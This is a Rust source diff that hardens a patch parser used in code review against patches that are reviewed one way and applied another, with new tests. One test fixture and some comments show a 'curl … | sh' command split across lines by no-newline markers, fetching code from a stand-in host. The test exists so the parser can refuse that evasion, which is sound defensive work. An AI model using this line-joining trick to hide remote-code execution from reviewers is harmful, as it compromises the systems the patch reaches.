@@ -181,6 +181,10 @@ struct FileBuf {
     awaiting_new_header: bool,
     /// The file's `---`/`+++` or first hunk arrived: extended headers are no longer admitted.
     past_headers: bool,
+    /// The line number of a `\ No newline at end of file` marker that ended the old side, and
+    /// of one that ended the new side: no later body line may add to a side its marker ended.
+    eof_old: Option<usize>,
+    eof_new: Option<usize>,
 }
 
 /// Working accumulator for one hunk.
@@ -228,11 +232,18 @@ impl Parser {
             if !can_mark_eof || line != "\\ No newline at end of file" {
                 return Err(PatchParseError::InvalidEofMarker { line_number });
             }
+            let kind = self.last_body_line().map(|previous| {
+                previous.no_newline = true;
+                previous.kind
+            });
             if let Some(file) = self.file.as_mut() {
                 file.metadata.push(line.to_string());
-            }
-            if let Some(previous) = self.last_body_line() {
-                previous.no_newline = true;
+                if kind != Some(PatchLineKind::Added) {
+                    file.eof_old = Some(line_number);
+                }
+                if kind != Some(PatchLineKind::Removed) {
+                    file.eof_new = Some(line_number);
+                }
             }
             return Ok(());
         }
@@ -242,6 +253,11 @@ impl Parser {
                 && let Some(consumed) = hunk.consume_body(line, line_number)
             {
                 consumed?;
+                if let Some(marker) = self.file.as_ref().and_then(|f| f.ended_side(line)) {
+                    return Err(PatchParseError::InvalidEofMarker {
+                        line_number: marker,
+                    });
+                }
                 self.can_mark_eof = true;
                 if hunk.rem_old == 0 && hunk.rem_new == 0 {
                     // Counts satisfied: a clean close (cannot truncate).
@@ -277,6 +293,12 @@ impl Parser {
             }
             return Err(PatchParseError::UnsupportedFormat { line_number });
         }
+        // Git drops the carriage returns that end a header line (a patch saved with CRLF line
+        // ends): `--- /dev/null\r` is `/dev/null` and `+++ b/x\r` names `x`. Kept, the CR made
+        // an added file `modified` under a path ending in CR, so its new-file and path signals
+        // were lost (bug hunt 2026-11-01). A CR that belongs to a name arrives quoted (`"x\r"`).
+        // Body lines keep theirs: there it is content.
+        let line = line.trim_end_matches('\r');
         // A `---` is a header only with its `+++` right after it; git ignores either alone, so
         // taking one as a header changed the reviewed path or made a phantom file (bug hunt
         // 2026-10-28, H1-01).
@@ -323,24 +345,30 @@ impl Parser {
         // the filename itself contains ` b/`, the `---`/`+++` headers (set by
         // on_old_header / on_new_header) override these values and are used
         // for the final path, so an incorrect git-header split is harmless in
-        // practice.  An absent ` b/` (unusual / malformed) leaves both None so
-        // the caller falls back to the `---`/`+++` paths.
+        // practice.  Without a ` b/` (other prefixes, such as `i/` and `w/`), the
+        // line is split as Git splits it, where both halves name one path (see
+        // [`same_name_halves`]); with no such split both stay None and the caller
+        // falls back to the `---`/`+++` paths.
         if rest.starts_with('"') {
             let (old, remaining) = super::paths::decode_quoted_prefix(rest)
                 .ok_or(PatchParseError::InvalidPath { line_number })?;
             let new = super::paths::decode_path(remaining.trim_start())
                 .ok_or(PatchParseError::InvalidPath { line_number })?;
-            file.git_old = Some(strip_ab(&old));
-            file.git_new = Some(strip_ab(&new));
+            file.git_old = Some(strip_p1(&old));
+            file.git_new = Some(strip_p1(&new));
         } else if let Some(sep) = rest.rfind(" \"b/").or_else(|| rest.rfind(" b/")) {
-            file.git_old = Some(strip_ab(
+            file.git_old = Some(strip_p1(
                 &super::paths::decode_path(&rest[..sep])
                     .ok_or(PatchParseError::InvalidPath { line_number })?,
             ));
-            file.git_new = Some(strip_ab(
+            file.git_new = Some(strip_p1(
                 &super::paths::decode_path(&rest[sep + 1..])
                     .ok_or(PatchParseError::InvalidPath { line_number })?,
             ));
+        } else if let Some(name) = same_name_halves(rest) {
+            // Other prefixes (`diff.mnemonicPrefix`'s `i/` and `w/`, say): Git's own split.
+            file.git_old = Some(name.to_owned());
+            file.git_new = Some(name.to_owned());
         }
         self.file = Some(file);
         Ok(())
@@ -428,6 +456,14 @@ impl Parser {
                 .any(|p| line.starts_with(p));
         if extended && file.past_headers {
             return Err(PatchParseError::MisplacedHeader { line_number });
+        }
+        // `git apply` also reads `rename old`/`rename new` as `rename from`/`rename to`, which no
+        // current Git writes. Ignored, they let a rename be reviewed as `modified <new>`, hiding
+        // that the old path goes (bug hunt 2026-11-01); they are refused, not translated.
+        if !file.past_headers
+            && (line.starts_with("rename old ") || line.starts_with("rename new "))
+        {
+            return Err(PatchParseError::UnsupportedFormat { line_number });
         }
         let moved_path = |path: &str| {
             super::paths::decode_path(path)
@@ -562,7 +598,7 @@ impl Parser {
                     if file
                         .old_raw
                         .as_deref()
-                        .is_some_and(|old| strip_ab(old) != from)
+                        .is_some_and(|old| strip_p1(old) != from)
                         || file.new_raw.as_deref() == Some("/dev/null")
                         || file.metadata.iter().any(|m| {
                             m.starts_with("new file mode ") || m.starts_with("deleted file mode ")
@@ -665,6 +701,19 @@ impl HunkBuf {
 }
 
 impl FileBuf {
+    /// The marker that ended the side the body line `line` adds to, if one did. The marker drops
+    /// the newline of the line before it, so Git joins the next line of that side onto it: `+cu`,
+    /// a marker, then `+rl … | sh` was reviewed as two lines and applied as one `curl … | sh`
+    /// (bug hunt 2026-11-01). A marker must end its side of the file.
+    fn ended_side(&self, line: &str) -> Option<usize> {
+        match line.as_bytes().first() {
+            Some(b'-') => self.eof_old,
+            Some(b'+') => self.eof_new,
+            // A context line, with or without its leading space, is on both sides.
+            _ => self.eof_old.or(self.eof_new),
+        }
+    }
+
     fn into_review_file(self) -> ReviewFile {
         let status = self.resolve_status();
         let path = self.resolve_path();
@@ -746,12 +795,12 @@ impl FileBuf {
             .new_raw
             .as_deref()
             .filter(|p| *p != "/dev/null")
-            .map(strip_ab);
+            .map(strip_p1);
         let old_side = self
             .old_raw
             .as_deref()
             .filter(|p| *p != "/dev/null")
-            .map(strip_ab);
+            .map(strip_p1);
         new_side
             .or(old_side)
             .or_else(|| self.git_new.clone())
@@ -826,12 +875,32 @@ fn parse_range(range: &str) -> Option<(u32, u32)> {
     Some((start, count))
 }
 
-/// Strip a leading `a/` or `b/` Git diff prefix.
-fn strip_ab(path: &str) -> String {
-    path.strip_prefix("a/")
-        .or_else(|| path.strip_prefix("b/"))
-        .unwrap_or(path)
+/// Strip a header path's first component, as `git apply`'s default `-p1` does: `a/` and `b/`,
+/// but also the `i/`, `w/`, `c/` and `o/` of `diff.mnemonicPrefix`, a custom `--src-prefix`, or
+/// the first directory of a plain `diff -u old/x new/x`. Only a literal `a/` or `b/` was
+/// stripped, so `--- vendor/build.rs` was reviewed as vendored code while Git wrote the top-level
+/// `build.rs` (bug hunt 2026-11-01). A path with no `/` is kept whole, as Git keeps it.
+fn strip_p1(path: &str) -> String {
+    path.split_once('/')
+        .map_or(path, |(_, rest)| rest)
         .to_string()
+}
+
+/// The name in an unquoted `diff --git X/NAME Y/NAME` line whose prefixes are not `a/` and `b/`,
+/// found as `git apply` finds it: the split at a space or tab where both halves name the same
+/// path once their first components are stripped. `None` when no split does (the names differ).
+fn same_name_halves(rest: &str) -> Option<&str> {
+    let (_, name) = rest.split_once('/')?;
+    name.char_indices()
+        .filter(|&(_, c)| c == ' ' || c == '\t')
+        .find_map(|(at, _)| {
+            // The second half's first component starts at the separator itself.
+            let (first, second) = name.split_at(at);
+            second
+                .split_once('/')
+                .is_some_and(|(_, second)| second == first)
+                .then_some(first)
+        })
 }
 
 /// Extract the path from a `---`/`+++` header value, dropping a trailing tab
@@ -1501,6 +1570,63 @@ diff --git a/x b/x
         );
     }
 
+    /// A marker drops the newline of the line before it, so Git joins that side's next line onto
+    /// it: `+cu`, a marker, `+rl … | s`, a marker, `+h` applies as one `curl … | sh` line while
+    /// the review showed three harmless ones (bug hunt 2026-11-01). A marker must end its side of
+    /// the file: a later line of that side, in the same hunk or a later one, refuses the patch at
+    /// the marker. The other side may go on, as Git writes it when both last lines change.
+    #[test]
+    fn an_eof_marker_must_end_its_side() {
+        let marker = "\\ No newline at end of file\n";
+        let refused = |body: &str| parse(&format!("--- a/x\n+++ b/x\n{body}")).unwrap_err();
+        for (body, line_number) in [
+            // The hunter's patch: an added line marked, then more added lines.
+            (
+                format!(
+                    "@@ -1 +1,4 @@\n echo hi\n+cu\n{marker}+rl -fsSL https://e.example/x | s\n{marker}+h\n"
+                ),
+                6,
+            ),
+            // A removed line marked, then another removed line.
+            (format!("@@ -1,2 +0,0 @@\n-a\n{marker}-b\n"), 5),
+            // A context line marked ends both sides: neither may go on.
+            (format!("@@ -1,2 +1,2 @@\n a\n{marker}+b\n-c\n"), 5),
+            (format!("@@ -1,2 +1,2 @@\n a\n{marker}-c\n+b\n"), 5),
+            // A later hunk of the file adds to a side a marker ended.
+            (
+                format!("@@ -1 +1 @@\n-a\n+b\n{marker}@@ -5 +5 @@\n-e\n+f\n"),
+                6,
+            ),
+            (
+                format!("@@ -1 +1 @@\n-a\n{marker}+b\n@@ -5 +5 @@\n-e\n+f\n"),
+                5,
+            ),
+        ] {
+            assert_eq!(
+                refused(&body),
+                PatchParseError::InvalidEofMarker { line_number },
+                "{body}"
+            );
+        }
+        // Git's own forms: the old side's last line marked before the new side's lines, a marker
+        // on each side, and the next file's hunks, which a marker does not reach.
+        for body in [
+            format!("@@ -1 +1 @@\n-a\n{marker}+b\n{marker}"),
+            format!("@@ -1 +1,2 @@\n-a\n{marker}+a\n+b\n"),
+            format!("@@ -1,2 +1 @@\n+x\n{marker}-a\n-b\n"),
+            format!("@@ -1 +1 @@\n-a\n+b\n{marker}--- a/y\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n"),
+        ] {
+            let files = parse(&format!("--- a/x\n+++ b/x\n{body}")).unwrap();
+            assert!(
+                files[0].patch_twin.hunks[0]
+                    .lines
+                    .iter()
+                    .any(|l| l.no_newline),
+                "{body}"
+            );
+        }
+    }
+
     #[test]
     fn malformed_hunk_header_is_an_error() {
         let input = "\
@@ -1845,10 +1971,120 @@ diff --git a/x b/x
     }
 
     #[test]
-    fn strip_ab_removes_prefixes() {
-        assert_eq!(strip_ab("a/src/x.rs"), "src/x.rs");
-        assert_eq!(strip_ab("b/src/x.rs"), "src/x.rs");
-        assert_eq!(strip_ab("plain"), "plain");
+    fn strip_p1_removes_the_first_component() {
+        assert_eq!(strip_p1("a/src/x.rs"), "src/x.rs");
+        assert_eq!(strip_p1("b/src/x.rs"), "src/x.rs");
+        assert_eq!(strip_p1("w/src/x.rs"), "src/x.rs");
+        assert_eq!(strip_p1("vendor/build.rs"), "build.rs");
+        assert_eq!(strip_p1("/abs/x"), "abs/x");
+        assert_eq!(strip_p1("plain"), "plain");
+    }
+
+    /// The reviewed path is the one `git apply` (default `-p1`) writes, whatever the first
+    /// component is. Only `a/` and `b/` were stripped: `--- vendor/build.rs` was reviewed as
+    /// vendored code while Git wrote the top-level `build.rs`, and a `diff.mnemonicPrefix` diff
+    /// was reviewed as `w/build.rs` (bug hunt 2026-11-01).
+    #[test]
+    fn header_paths_lose_their_first_component_as_git_apply_strips_it() {
+        let hunk = "@@ -1 +1 @@\n-a\n+b\n";
+        for (headers, path) in [
+            ("--- vendor/build.rs\n+++ vendor/build.rs\n", "build.rs"),
+            ("--- orig/src/x.c\n+++ new/src/x.c\n", "src/x.c"),
+            (
+                "diff --git i/build.rs w/build.rs\n--- i/build.rs\n+++ w/build.rs\n",
+                "build.rs",
+            ),
+            ("--- build.rs\n+++ build.rs\n", "build.rs"),
+            ("--- a/x\n+++ b/x\n", "x"),
+        ] {
+            assert_eq!(one(&format!("{headers}{hunk}")).path, path, "{headers}");
+        }
+        // Without `---`/`+++`, the `diff --git` names are split as Git splits them: where both
+        // halves name the same path, so a name with a space survives.
+        for (line, path) in [
+            ("diff --git i/x w/x", "x"),
+            ("diff --git c/a b w/a b", "a b"),
+            ("diff --git a/x b/x", "x"),
+        ] {
+            let file = one(&format!("{line}\nold mode 100644\nnew mode 100755\n"));
+            assert_eq!(
+                (file.path.as_str(), file.status),
+                (path, FileStatus::ModeChanged),
+                "{line}"
+            );
+        }
+        assert_eq!(same_name_halves("i/x w/y"), None);
+        assert_eq!(same_name_halves("i/x\tw/x"), Some("x"));
+        assert_eq!(same_name_halves("nothing"), None);
+    }
+
+    /// Git drops the carriage returns ending a header line, so a CRLF patch names the paths and
+    /// the `/dev/null` sides Git applies. Kept, `--- /dev/null\r` made an added CI workflow a
+    /// `modified` file under a path ending in CR, losing its new-file and CI signals (bug hunt
+    /// 2026-11-01). Body lines keep their CR (content), and a quoted CR stays in the name.
+    #[test]
+    fn crlf_header_lines_name_the_paths_git_applies() {
+        let added = one(
+            "--- /dev/null\r\n+++ b/.github/workflows/ci.yml\r\n@@ -0,0 +1 @@\r\n+on: pull_request_target\r\n",
+        );
+        assert_eq!(
+            (added.path.as_str(), added.status),
+            (".github/workflows/ci.yml", FileStatus::Added)
+        );
+        assert_eq!(
+            added.patch_twin.hunks[0].lines[0].text,
+            "on: pull_request_target\r"
+        );
+        assert_eq!(added.patch_twin.hunks[0].section, None);
+        let deleted = one("--- a/x\r\n+++ /dev/null\r\n@@ -1 +0,0 @@\r\n-a\r\n");
+        assert_eq!(
+            (deleted.path.as_str(), deleted.status),
+            ("x", FileStatus::Deleted)
+        );
+        let git = one(
+            "diff --git a/x b/x\r\nold mode 100644\r\nnew mode 100755\r\n--- a/x\r\n+++ b/x\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n",
+        );
+        assert_eq!(git.path, "x");
+        assert_eq!(
+            git.patch_twin.metadata,
+            ["old mode 100644", "new mode 100755"]
+        );
+        let renamed =
+            one("diff --git a/x b/y\r\nsimilarity index 90%\r\nrename from x\r\nrename to y\r\n");
+        assert_eq!(
+            (renamed.path.as_str(), renamed.status),
+            ("y", FileStatus::Renamed)
+        );
+        let out = crate::render_unified(std::slice::from_ref(&renamed));
+        assert!(
+            out.contains("diff --git a/x b/y\nsimilarity index 90%\nrename from x\n"),
+            "{out}"
+        );
+        // `format-patch`'s bare `---` framing line, CRLF-converted, is still framing.
+        assert_eq!(
+            one("Subject: x\r\n---\r\n--- a/x\r\n+++ b/x\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n").path,
+            "x"
+        );
+        let quoted = one("--- \"a/x\\r\"\n+++ \"b/x\\r\"\n@@ -1 +1 @@\n-a\n+b\n");
+        assert_eq!(quoted.path, "x\r");
+    }
+
+    /// `git apply` reads `rename old`/`rename new` as `rename from`/`rename to`; ignored, they let
+    /// a rename be reviewed as `modified <new>` with no sign that the old path goes (bug hunt
+    /// 2026-11-01). No current Git writes them, so they are refused rather than translated.
+    #[test]
+    fn rename_old_and_rename_new_are_refused() {
+        for line in ["rename old x", "rename new y"] {
+            assert_eq!(
+                parse(&format!(
+                    "diff --git a/x b/y\nsimilarity index 90%\n{line}\n--- a/x\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n"
+                )),
+                Err(PatchParseError::UnsupportedFormat { line_number: 3 }),
+                "{line}"
+            );
+        }
+        // After the file's headers Git does not read them as headers, and neither does DDF.
+        assert!(parse("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\nrename old x\n").is_ok());
     }
 
     #[test]
